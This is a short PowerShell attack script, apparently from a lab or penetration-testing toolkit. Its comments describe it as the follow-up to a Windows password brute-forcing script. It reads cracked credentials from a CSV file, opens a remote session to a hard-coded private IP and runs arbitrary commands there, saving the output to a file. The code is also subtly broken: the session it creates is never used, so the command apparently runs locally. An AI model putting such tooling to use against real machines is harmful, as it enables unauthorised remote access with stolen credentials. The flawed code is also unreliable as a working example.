# Run bruteforceWindowsOS.ps1 first to get the password, then run this script to run arbitrary Powershell commands
# You can change the variables below as required

# Import a CSV file with credentials
$credential = Import-Csv -Path "Powershell\credentials.csv" | Select-Object -First 1

# Define IP address
#$ip = "172.16.2.223"
$ip = "172.16.2.77"

# Define inner command to run
$cmdstring = "Get-Service"

# Define filename + filepath to save to
$out = "Powershell\test.txt"

# Convert inner command to scriptblock format
$sb = [scriptblock]::Create($cmdstring)

# Oneliner to read username, password from file, then start a new PSSession
New-PSSession -ComputerName $ip -Credential (New-Object System.Management.Automation.PSCredential -ArgumentList $credential.Username, (ConvertTo-SecureString $credential.Password -AsPlainText -Force))
Invoke-Command -ScriptBlock $sb | Out-File -FilePath $out
Exit-PSSession
